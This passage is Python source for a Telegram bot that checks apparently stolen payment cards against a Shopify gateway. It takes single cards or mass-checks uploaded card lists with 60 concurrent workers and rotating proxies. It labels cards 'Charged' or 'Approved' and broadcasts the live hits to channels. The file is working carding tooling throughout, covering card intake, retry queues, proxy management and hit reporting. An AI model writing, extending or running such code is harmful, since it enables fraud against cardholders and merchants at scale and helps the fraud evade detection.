        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

# ========== Start ==========
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   🦉 Add proxy: <code>/addproxy</code>
   🦉 Check CC: <code>/cc card|mm|yy|cvv</code>

BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢 (@MA_S_t0)"""

    buttons = get_main_menu_keyboard(user_id)

    if image_exists():
        try:
            await event.reply(premium_emoji(welcome_text), file=IMAGE_FILE,
                              buttons=buttons, parse_mode='html')
            return
        except Exception as e:
            logger.error(f"Send image failed: {e}")

    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

# ========== Cancel ==========
@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_command(event):
    user_id = event.sender_id
    if user_id in admin_states:
        admin_states.pop(user_id, None)
        await event.reply(premium_emoji("✅ Cancelled."), parse_mode='html')

# ========== Maintenance Command ==========
@bot.on(events.NewMessage(pattern=r'^[/.]maintenance\s+(on|off)$'))
async def maintenance_cmd(event):
    if not is_admin(event.sender_id):
        return
    arg = event.message.text.lower().split()[1]
    enabled = (arg == "on")
    await set_maintenance(enabled)

    if enabled:
        msg = "🔴 <b>Maintenance ON</b>\n\nBot is now under maintenance."
    else:
        msg = "🟢 <b>Maintenance OFF</b>\n\nBot is now open for all users."

    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== Callbacks: Menu ==========
@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 User Commands

🛒 Shopify
├─ <code>/cc cc|mm|yy|cvv</code> → Check single card
└─ <code>/chk</code> → Mass check from .txt file

🔌 Proxy Management
├─ <code>/proxy</code> → Check & remove dead proxies
├─ <code>/addproxy</code> → Add proxies
├─ <code>/chkproxy proxy</code> → Check single proxy
├─ <code>/rmproxy proxy</code> → Remove single proxy
├─ <code>/rmproxyindex 1,2,3</code> → Remove by index
├─ <code>/clearproxy</code> → Remove all proxies
└─ <code>/getproxy</code> → Get all proxies"""

    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   ➥ Add proxy: <code>/addproxy</code>
   ➥ Check CC: <code>/cc card|mm|yy|cvv</code>

BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢 (@MA_S_t0)"""

    buttons = get_main_menu_keyboard(user_id)

    if image_exists():
        try:
            await event.delete()
            await bot.send_file(user_id, IMAGE_FILE, caption=premium_emoji(welcome_text),
                                buttons=buttons, parse_mode='html')
            return
        except Exception as e:
            logger.error(f"Send image failed: {e}")

    try:
        await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
    except:
        pass

# ========== Admin Panel ==========
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return

    maint_status = "🔴 ON" if await get_maintenance() else "🟢 OFF"

    admin_text = f"""👑 <b>Admin Panel</b>

🔧 <b>Maintenance:</b> {maint_status}
   └ <code>/maintenance on</code> | <code>/maintenance off</code>

📊 <b>Bot Statistics</b>
└─ View live bot stats

📡 <b>Broadcast Channels</b>
├─ List channels/groups
└─ Remove channel/group

🖼️ <b>Bot Image</b>
└─ Add / Remove welcome image"""

    buttons = [
        [Button.inline(" 📡 Broadcast Channels", b"broadcast_menu", style="primary")],
        [Button.inline(" 🖼️ Bot Image", b"image_menu", style="success")],
        [Button.inline(" 📊 Bot Statistics", b"stats_menu", style="success")],
        [Button.inline(" Back", b"main_menu", style="danger")]
    ]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')

# ========== Stats Menu ==========
@bot.on(events.CallbackQuery(data=b"stats_menu"))
async def stats_menu_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    proxies = load_proxies()
    uptime = time.time() - bot_stats['started_at']
    hours, rem = divmod(int(uptime), 3600)
    minutes, seconds = divmod(rem, 60)

    maint_status = "🔴 ON" if await get_maintenance() else "🟢 OFF"

    stats_text = f"""📊 <b>Bot Statistics</b>

⏱️ <b>Uptime:</b> {hours}h {minutes}m {seconds}s
👑 <b>Admins:</b> {len(ADMIN_ID)}
🌐 <b>Site:</b> <code>{DEFAULT_SITE}</code>
🔌 <b>Proxies:</b> {len(proxies)}
🔄 <b>Active Sessions:</b> {len(active_sessions)}
📡 <b>Broadcast Channels:</b> {len(load_channels())}
🖼️ <b>Bot Image:</b> {'✅ Set' if image_exists() else '❌ Not Set'}
🔧 <b>Maintenance:</b> {maint_status}

📈 <b>Lifetime Stats</b>
├─ 🔍 Total Checks: <b>{bot_stats['total_checks']}</b>
├─ ✅ Charged: <b>{bot_stats['total_charged']}</b>
├─ 🟢 Approved: <b>{bot_stats['total_approved']}</b>
└─ ❌ Declined: <b>{bot_stats['total_dead']}</b>

🤖 <b>Status:</b> Running ✅"""

    buttons = [[Button.inline(" Back", b"admin_panel", style="danger")]]
    await event.edit(premium_emoji(stats_text), buttons=buttons, parse_mode='html')

# ========== Image Menu ==========
@bot.on(events.CallbackQuery(data=b"image_menu"))
async def image_menu_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    exists = image_exists()
    status = "✅ <b>Active</b>" if exists else "❌ <b>Not Set</b>"

    text = f"""🖼️ <b>Bot Welcome Image</b>

📊 <b>Status:</b> {status}

✨ <b>How it works:</b>
The image will be shown to all users
when they open the main menu or send /start.

⚠️ <b>Note:</b> Recommended size — 1280x720 or square."""

    buttons = []
    if exists:
        buttons.append([Button.inline(" 🗑️ Remove Image", b"remove_image", style="danger")])
    buttons.append([Button.inline(" ➕ Add Image", b"add_image", style="success")])
    buttons.append([Button.inline(" Back", b"admin_panel", style="danger")])

    if exists:
        try:
            await event.delete()
            await bot.send_file(user_id, IMAGE_FILE, caption=premium_emoji(text),
                                buttons=buttons, parse_mode='html')
            return
        except Exception as e:
            logger.error(f"Image preview failed: {e}")

    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"add_image"))
async def add_image_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    text = """🖼️ <b>Add Bot Image</b>

📝 Send the image you want to set as
the main menu image of the bot.

💡 <b>Tips:</b>
• Send as <b>photo</b> (not as file)
• Recommended: 1280x720 or square
• Any format supported (JPG, PNG)

Send the image now 👇"""

    admin_states[user_id] = 'awaiting_image'
    buttons = [[Button.inline(" Cancel", b"image_menu", style="danger")]]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"remove_image"))
async def remove_image_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    if not image_exists():
        await event.answer("❌ No image to remove.", alert=True)
        return

    try:
        os.remove(IMAGE_FILE)
        logger.info(f"Welcome image removed by admin {user_id}")
        await event.answer("✅ Image removed!", alert=True)
        await image_menu_callback(event)
    except Exception as e:
        await event.answer(f"❌ Error: {str(e)[:80]}", alert=True)

# ========== Broadcast Menu (بدون Add Channel) ==========
@bot.on(events.CallbackQuery(data=b"broadcast_menu"))
async def broadcast_menu_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    channels = load_channels()
    count = len(channels)

    text = f"""📡 <b>Broadcast Channels</b>

📊 <b>Total:</b> <code>{count}</code>
🟢 <b>Status:</b> {'Active' if count > 0 else 'No channels added'}

✨ <b>How it works:</b>
When any user gets a <b>Charged</b> or <b>Approved</b> hit,
the bot will automatically post it to all channels below.

⚠️ <b>Note:</b> Bot must be an admin in each channel/group."""

    buttons = [
        [Button.inline(" 📋 List Channels", b"list_channels", style="primary")],
        [Button.inline(" 🗑️ Remove Channel", b"remove_channel_menu", style="danger")],
        [Button.inline(" Back", b"admin_panel", style="danger")]
    ]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

# ========== Handle Admin Input ==========
@bot.on(events.NewMessage())
async def handle_admin_input(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return

    state = admin_states.get(user_id)

    if state == 'awaiting_image':
        if not event.message.photo:
            await event.reply(premium_emoji(
                "❌ <b>Please send a valid photo</b>\n\n"
                "Send the image as <b>photo</b>, not as file.\n\n"
                "Or send /cancel to cancel."
            ), parse_mode='html')
            return

        admin_states.pop(user_id, None)

        try:
            path = await event.download_media(file=IMAGE_FILE)
            await event.reply(premium_emoji(
                f"✅ <b>Image Saved Successfully!</b>\n\n"
                f"🖼️ <b>Saved as:</b> <code>{IMAGE_FILE}</code>\n\n"
                f"✨ The image will now appear with the main menu."
            ), parse_mode='html')
            logger.info(f"Welcome image saved by admin {user_id}")
        except Exception as e:
            logger.error(f"Image save failed: {e}")
            await event.reply(premium_emoji(
                f"❌ <b>Failed to save image</b>\n\n"
                f"<b>Error:</b> <code>{str(e)[:120]}</code>"
            ), parse_mode='html')

# ========== List Channels ==========
@bot.on(events.CallbackQuery(data=b"list_channels"))
async def list_channels_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    channels = load_channels()
    if not channels:
        text = "📭 <b>No channels added yet.</b>"
    else:
        lines = []
        for i, ch in enumerate(channels, 1):
            lines.append(f"{i}. <b>{ch['title']}</b>\n    🆔 <code>{ch['id']}</code>")
        text = f"📡 <b>Broadcast Channels ({len(channels)})</b>\n\n" + "\n\n".join(lines)

    buttons = [[Button.inline(" Back", b"broadcast_menu", style="danger")]]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

# ========== Remove Channel Menu ==========
@bot.on(events.CallbackQuery(data=b"remove_channel_menu"))
async def remove_channel_menu_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    channels = load_channels()
    if not channels:
        await event.answer("No channels to remove.", alert=True)
        return

    buttons = []
    for ch in channels:
        buttons.append([Button.inline(
            f" 🗑️ {ch['title'][:30]}",
            f"del_ch_{ch['id']}".encode(),
            style="danger"
        )])
    buttons.append([Button.inline(" Back", b"broadcast_menu", style="danger")])

    text = "🗑️ <b>Select a channel to remove:</b>"
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=rb"del_ch_(-?\d+)"))
async def confirm_delete_channel(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    channel_id = int(event.pattern_match.group(1).decode())
    removed = await remove_channel(channel_id)

    if removed:
        await event.answer("✅ Channel removed!", alert=True)
        channels = load_channels()
        if not channels:
            await broadcast_menu_callback(event)
            return
        buttons = []
        for ch in channels:
            buttons.append([Button.inline(
                f" 🗑️ {ch['title'][:30]}",
                f"del_ch_{ch['id']}".encode(),
                style="danger"
            )])
        buttons.append([Button.inline(" Back", b"broadcast_menu", style="danger")])
        text = "🗑️ <b>Select a channel to remove:</b>"
        await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')
    else:
        await event.answer("❌ Channel not found.", alert=True)

# ========== Single CC Check ==========
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    if await check_maintenance(event): return

    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    ok, reason = can_check(user_id)
    if not ok:
        await event.reply(premium_emoji(reason), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji(
            "❌ No proxy found!\n\n"
            "Please add a proxy first using:\n"
            "<code>/addproxy ip:port:user:pass</code>\n\n"
            "Or check your proxies with:\n"
            "<code>/proxy</code>"
        ), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    user_locks[user_id] = True
    user_last_check[user_id] = time.time()

    status_msg = await event.reply(premium_emoji(f"🔄 Checking <code>{card}</code>..."), parse_mode='html')

    try:
        result = await check_card_with_retry(card, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        else:
            status_header = "❌ DECLINED"

        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢 (@MA_S_t0)"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

        if result['status'] in ['Charged', 'Approved']:
            try:
                await broadcast_hit(result, result['status'], username=username)
            except Exception as e:
                logger.error(f"broadcast_hit error: {e}")

        bot_stats['total_checks'] += 1
        if result['status'] == 'Charged':
            bot_stats['total_charged'] += 1
        elif result['status'] == 'Approved':
            bot_stats['total_approved'] += 1
        else:
            bot_stats['total_dead'] += 1
        save_stats(bot_stats)

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        user_locks.pop(user_id, None)
        user_last_check[user_id] = time.time()

# ========== Mass Check (WITH RETRY QUEUE) ==========
@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    if await check_maintenance(event): return

    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    ok, reason = can_check(user_id)
    if not ok:
        await event.reply(premium_emoji(reason), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    if reply_msg.file.size > MAX_FILE_SIZE:
        await event.reply(premium_emoji("❌ File too large (max 10MB)."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji(
            "❌ No proxy found!\n\n"
            "Please add a proxy first using:\n"
            "<code>/addproxy ip:port:user:pass</code>\n\n"
            "Or check your proxies with:\n"
            "<code>/proxy</code>"
        ), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')

    file_path = None
    cards = []

    try:
        file_path = await reply_msg.download_media()

        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        cards = extract_cc(content)
    except Exception as e:
        logger.error(f"File read error: {e}")
        await status_msg.edit(premium_emoji(f"❌ Error reading file: {e}"), parse_mode='html')
        return
    finally:
        if file_path and os.path.exists(file_path):
            try:
                os.remove(file_path)
                logger.info(f"🗑️ Temp cards file deleted: {file_path}")
            except Exception as e:
                logger.error(f"Delete cards file failed: {e}")

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        return

    if not is_admin(user_id) and len(cards) > MAX_CARDS_PER_FILE:
        await status_msg.edit(premium_emoji(
            f"⚠️ <b>Limit Exceeded</b>\n\n"
            f"Maximum <b>{MAX_CARDS_PER_FILE} cards</b> per file.\n"
            f"Your file contains <b>{len(cards)}</b> cards.\n\n"
            f"💡 Please split the file and try again."
        ), parse_mode='html')
        return

    total_cards = len(cards)
    user_locks[user_id] = True
    user_last_check[user_id] = time.time()

    await status_msg.edit(premium_emoji(f"🔥 Starting check for {total_cards} cards..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': total_cards, 'checked': 0,
        'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-',
        'last_gateway': 'Unknown', 'pending': total_cards
    }

    try:
        retry_queue = asyncio.Queue()
        for card in cards:
            retry_queue.put_nowait({"card": card, "attempts": 0})

        last_update_time = [time.time()]

        async def worker():
            while not retry_queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return

                try:
                    card_info = retry_queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                card = card_info["card"]
                attempts = card_info["attempts"]

                current_proxies = load_proxies()
                if not current_proxies:
                    break

                res = await check_card(card, random.choice(current_proxies))

                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')

                if res['status'] == 'Charged':
                    all_results['checked'] += 1
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                elif res['status'] == 'Approved':
                    all_results['checked'] += 1
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                elif res['status'] == 'Dead':
                    all_results['checked'] += 1
                    all_results['dead'].append(res)
                else:
                    if attempts + 1 < MAX_CARD_ATTEMPTS:
                        retry_queue.put_nowait({"card": card, "attempts": attempts + 1})
                    else:
                        all_results['checked'] += 1
                        all_results['dead'].append(res)

                all_results['pending'] = retry_queue.qsize()
                retry_queue.task_done()

                now = time.time()
                if now - last_update_time[0] >= 2.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(60)]

        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
            while len(workers) < 60 and not retry_queue.empty() and session_key in active_sessions:
                workers.append(asyncio.create_task(worker()))

        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        user_locks.pop(user_id, None)
        user_last_check[user_id] = time.time()

        bot_stats['total_checks'] += len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])
        bot_stats['total_charged'] += len(all_results['charged'])
        bot_stats['total_approved'] += len(all_results['approved'])
        bot_stats['total_dead'] += len(all_results['dead'])
        save_stats(bot_stats)

        try:
            await status_msg.delete()
        except:
            pass

        await send_final_results(user_id, all_results)
        # ========== Pause / Resume / Stop ==========
@bot.on(events.CallbackQuery(pattern=rb"pause_(\d+)"))
async def pause_handler(event):
    user_id = int(event.pattern_match.group(1).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Not your session.", alert=True)
        return
    session_key = f"{user_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused", alert=True)

@bot.on(events.CallbackQuery(pattern=rb"resume_(\d+)"))
async def resume_handler(event):
    user_id = int(event.pattern_match.group(1).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Not your session.", alert=True)
        return
    session_key = f"{user_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed", alert=True)

@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Not your session.", alert=True)
        return
    session_key = f"{user_id}_{event.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped", alert=True)
        try:
            await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
        except:
            pass

# ========== Proxy Commands ==========
@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    if await check_maintenance(event): return

    user_id = event.sender_id

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addproxy</code> followed by proxies, one per line."), parse_mode='html')
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return

        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All proxies already exist."), parse_mode='html')
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(
            f"✅ <b>Added {len(new_proxies)} proxies!</b>\n\n"
            f"💾 <b>Total:</b> {len(load_proxies())}"
        ), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ proxy.txt is empty."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(proxies)} proxies..."), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    tested = 0
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                tested += 1
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            try:
                await status_msg.edit(premium_emoji(
                    f"⭐ <b>Done</b> ✅{len(alive_proxies)} ❌{len(dead_proxies)} | <b>Total:</b> {tested}/{len(proxies)}"
                ), parse_mode='html')
            except:
                pass

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        await status_msg.edit(premium_emoji(
            f"⭐ <b>Done</b> ✅{len(alive_proxies)} ❌{len(dead_proxies)} | <b>Total:</b> {len(proxies)}\n\n"
            f"💾 <b>Saved:</b> {len(alive_proxies)} proxies"
        ), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    if await check_maintenance(event): return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    if await check_maintenance(event): return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    if await check_maintenance(event): return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📦 Backup created!\n\nSending backup of {count} proxies..."),
                          file=backup_filename, parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return
    finally:
        try:
            if os.path.exists(backup_filename):
                os.remove(backup_filename)
                logger.info(f"🗑️ Proxy backup deleted: {backup_filename}")
        except Exception as e:
            logger.error(f"Delete backup failed: {e}")

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ Cleared all {count} proxies!\n\nproxy.txt is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        try:
            async with aiofiles.open(filename, 'w') as f:
                for i, proxy in enumerate(current_proxies):
                    await f.write(f"{i+1}. {proxy}\n")
            await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\nFile attached below."),
                              file=filename, parse_mode='html')
        finally:
            try:
                if os.path.exists(filename):
                    os.remove(filename)
                    logger.info(f"🗑️ Proxy list deleted: {filename}")
            except Exception as e:
                logger.error(f"Delete proxy list failed: {e}")

# ========== Main ==========
async def main():
    try:
        logger.info("🚀 Starting bot...")
        await load_maintenance()
        logger.info(f"🔧 Maintenance: {'ON' if await get_maintenance() else 'OFF'}")

        await bot.start(bot_token=BOT_TOKEN)
        me = await bot.get_me()
        logger.info(f"✅ Bot started as @{me.username} (ID: {me.id})")
        logger.info(f"👑 Admins: {ADMIN_ID}")
        logger.info(f"🌐 Site: {DEFAULT_SITE}")
        logger.info(f"📡 Broadcast Channel: {BROADCAST_CHANNEL_ID}")
        logger.info(f"🔒 Secret Channel: {SECRET_CHANNEL_ID}")
        logger.info("🤖 Bot is now listening for messages...")
        await bot.run_until_disconnected()
    except Exception as e:
        logger.error(f"❌ Bot crashed: {e}", exc_info=True)
        raise

if __name__ == "__main__":
    asyncio.run(main())
